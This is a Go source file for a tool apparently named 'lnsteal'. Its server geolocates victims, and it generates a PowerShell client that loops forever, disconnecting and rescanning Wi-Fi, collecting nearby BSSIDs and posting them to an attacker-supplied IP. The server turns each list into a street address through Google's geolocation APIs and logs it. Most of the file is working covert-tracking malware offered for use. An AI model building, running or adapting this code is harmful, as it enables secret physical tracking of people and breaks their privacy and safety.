package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/spf13/cobra"
)

var serverIp, port string

func apiRequest(macAddressList []string) string {

	type requestBody struct {
		HomeMobileCountryCode int                 `json:"homeMobileCountryCode"`
		HomeMobileNetworkCode int                 `json:"homeMobileNetworkCode"`
		RadioType             string              `json:"radioType"`
		ConsiderIp            bool                `json:"considerIp"`
		WifiAccessPoints      []map[string]string `json:"wifiAccessPoints"`
	}

	var wifi []map[string]string

	type location struct {
		Location map[string]float32
		Accuracy int
	}

	for _, item := range macAddressList {
		wifi = append(wifi, map[string]string{"macAddress": item})
	}

	params, _ := json.Marshal(&requestBody{310, 410, "lte", true, wifi})
	var url = fmt.Sprintf("https://www.googleapis.com/geolocation/v1/geolocate?key=%s", os.Getenv("GOOGLE_API_KEY"))
	postResponse, err := http.Post(url, "application/json", bytes.NewBuffer(params))
	defer postResponse.Body.Close()
	if err != nil {
		log.Fatal(err)
		return err.Error()
	}
	body, _ := ioutil.ReadAll(postResponse.Body)
	var locationBody location
	json.Unmarshal(body, &locationBody)
	url = fmt.Sprintf("https://maps.googleapis.com/maps/api/geocode/json?latlng=%f,%f&sensor=false&language=ja&key=%s", locationBody.Location["lat"], locationBody.Location["lng"], os.Getenv("GOOGLE_API_KEY"))
	response, err := http.Get(url)
	defer response.Body.Close()
	if err != nil {
		log.Fatal(err)
		return err.Error()
	}
	var resLocation map[string]interface{}
	geocodeBody, _ := ioutil.ReadAll(response.Body)
	json.Unmarshal(geocodeBody, &resLocation)

	return resLocation["results"].([]interface{})[0].(map[string]interface{})["formatted_address"].(string)
}

func postMacAddrHandler(w http.ResponseWriter, r *http.Request) {

	type macAddr struct {
		MacAddrList []string `json:"macaddr"`
	}

	w.WriteHeader(200)
	w.Header().Set("Content-Type", "application/json; charset=utf8")
	body, _ := ioutil.ReadAll(r.Body)
	var data macAddr
	if err := json.Unmarshal(body, &data); err != nil {
		log.Fatal(err)
	}
	realAddress := apiRequest(data.MacAddrList)
	log.Println(fmt.Sprintf("[+] Address Found: %s", realAddress))

}

func lnstealMain(c *cobra.Command, args []string) {
	build, err := c.PersistentFlags().GetBool("build")
	if err != nil {
		fmt.Println(err)
	}

	server, err := c.PersistentFlags().GetBool("server")
	if err != nil {
		fmt.Println(err)
	}

	if build && serverIp != "" {
		fmt.Println(`while($true) {$SSID = netsh wlan show interface | % { $_.trimstart() }  | Select-String -Pattern "^SSID.*" -AllMatches -Encoding default  |% {$_.ToString().Split(":")[1].trimstart()};netsh wlan disconnect;
		Start-Sleep 3;$bssidList = netsh wlan show network mode=bssid |% { $_.trimstart() }|Select-String -Pattern "^BSSID.*" -AllMatches -Encoding default |% {$_.ToString().Split(":")[1..6] -join ":"}|% { $_.trimstart() };$bssidList = @($bssidList);   
		$body = '{"macaddr":[';$maxItem =  $bssidList.Length;$count = 0;
		foreach ($item in $bssidList) {$count+=1;if($count -ge $maxItem) {$body+='"'+$item+'"'}else{$body+='"'+$item+'",'}};$body+="]}";netsh wlan connect name=$SSID;Start-Sleep 2;Invoke-WebRequest -Method POST -Headers @{"Content-Type"="application/json"} -Body "$body" http://` + serverIp + `:` + port + `/wifi;
		Start-Sleep 60
		}`)
		os.Exit(0)
	} else if server {
		http.HandleFunc("/wifi", postMacAddrHandler)
		if err := http.ListenAndServe(":"+port, nil); err != nil {
			log.Fatal(err)
		}
	} else {
		c.Help()
	}

}

func main() {
	rootCmd := &cobra.Command{
		Use: "lnsteal",
		Run: lnstealMain,
	}

	rootCmd.PersistentFlags().BoolP("build", "b", false, "build the client powershell code")
	rootCmd.PersistentFlags().StringVarP(&serverIp, "ip", "i", "", "IP address for client build")
	rootCmd.PersistentFlags().BoolP("server", "s", false, "starting the server")
	rootCmd.PersistentFlags().StringVarP(&port, "port", "p", "80", "Specify the port of the server")
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
